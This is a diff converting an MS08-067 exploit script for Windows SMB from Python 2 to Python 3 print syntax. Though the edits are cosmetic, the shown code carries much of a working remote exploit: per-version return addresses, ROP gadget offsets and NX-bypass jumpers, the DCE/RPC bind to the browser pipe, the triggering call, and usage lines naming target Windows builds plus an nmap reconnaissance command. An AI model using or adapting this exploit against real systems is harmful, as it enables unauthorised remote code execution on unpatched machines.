@@ -10,24 +10,24 @@ try:
     #from impacket.dcerpc import dcerpc
     from impacket.dcerpc.v5 import transport
 
-except ImportError, _:
-    print 'Install the following library to make this script work'
-    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
-    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
+except ImportError:
+    print ('Install the following library to make this script work')
+    print ('Impacket : https://github.com/CoreSecurity/impacket.git')
+    print ('PyCrypto : https://pypi.python.org/pypi/pycrypto')
     sys.exit(1)
 
-print '#######################################################################'
-print '#   MS08-067 Exploit'
-print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
-print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
-print '#'
-print '#   Mod in 2018 by Andy Acer:'
-print '#   - Added support for selecting a target port at the command line.'
-print '#     It seemed that only 445 was previously supported.'
-print '#   - Changed library calls to correctly establish a NetBIOS session for SMB transport'
-print '#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste'
-print '#     into this source file.'
-print '#######################################################################\n'
+print ('#######################################################################')
+print ('#   MS08-067 Exploit')
+print ('#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
+print ('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
+print ('#')
+print ('#   Mod in 2018 by Andy Acer:')
+print ('#   - Added support for selecting a target port at the command line.')
+print ('#     It seemed that only 445 was previously supported.')
+print ('#   - Changed library calls to correctly establish a NetBIOS session for SMB transport')
+print ('#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste')
+print ('#     into this source file.')
+print ('#######################################################################\n')
 
 
 # ------------------------------------------------------------------------
@@ -124,11 +124,11 @@ class SRVSVC_Exploit(Thread):
 
     def __DCEPacket(self):
         if (self.os == '1'):
-            print 'Windows XP SP0/SP1 Universal\n'
+            print ('Windows XP SP0/SP1 Universal\n')
             ret = "\x61\x13\x00\x01"
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '2'):
-            print 'Windows 2000 Universal\n'
+            print ('Windows 2000 Universal\n')
             ret = "\xb0\x1c\x1f\x00"
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '3'):
@@ -136,7 +136,7 @@ class SRVSVC_Exploit(Thread):
             ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '4'):
-            print 'Windows 2003 SP1 English\n'
+            print ('Windows 2003 SP1 English\n')
             ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
             ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
             jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
@@ -144,28 +144,28 @@ class SRVSVC_Exploit(Thread):
             jumper = disableNXjumper % (
                 ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
         elif (self.os == '5'):
-            print 'Windows XP SP3 French (NX)\n'
+            print ('Windows XP SP3 French (NX)\n')
             ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
             disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
             # the nonxjmper also work in this case.
             jumper = nonxjmper % (disable_nx, ret)
         elif (self.os == '6'):
-            print 'Windows XP SP3 English (NX)\n'
+            print ('Windows XP SP3 English (NX)\n')
             ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
             disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
             # the nonxjmper also work in this case.
             jumper = nonxjmper % (disable_nx, ret)
         elif (self.os == '7'):
-            print 'Windows XP SP3 English (AlwaysOn NX)\n'
+            print ('Windows XP SP3 English (AlwaysOn NX)\n')
             rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                 'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
             # the nonxjmper also work in this case.
             jumper = generate_rop(rvasets) + "AB"
         else:
-            print 'Not supported OS version\n'
+            print ('Not supported OS version\n')
             sys.exit(-1)
 
-        print '[-]Initiating connection'
+        print ('[-]Initiating connection')
 
         # MORE MODIFICATIONS HERE #############################################################################################
 
@@ -179,7 +179,7 @@ class SRVSVC_Exploit(Thread):
             self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
         
         self.__trans.connect()
-        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
+        print ('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
         self.__dce = self.__trans.DCERPC_class(self.__trans)
         self.__dce.bind(uuid.uuidtup_to_bin(
             ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
@@ -206,7 +206,7 @@ class SRVSVC_Exploit(Thread):
         self.__DCEPacket()
         self.__dce.call(0x1f, self.__stub)
         time.sleep(3)
-        print 'Exploit finish\n'
+        print ('Exploit finish\n')
 
 if __name__ == '__main__':
        try:
@@ -214,18 +214,18 @@ if __name__ == '__main__':
            os = sys.argv[2]
            port = sys.argv[3]
        except IndexError:
-                print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
-                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
-                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
-                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
-                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
-                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
-                print ''
-                print 'Also: nmap has a good OS discovery script that pairs well with this exploit:'
-                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
-                print ''
+                print ('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
+                print ('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
+                print ('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
+                print ('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
+                print ('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
+                print ('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
+                print ('')
+                print ('Also: nmap has a good OS discovery script that pairs well with this exploit:')
+                print ('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
+                print ('')
                 sys.exit(-1)
 
 
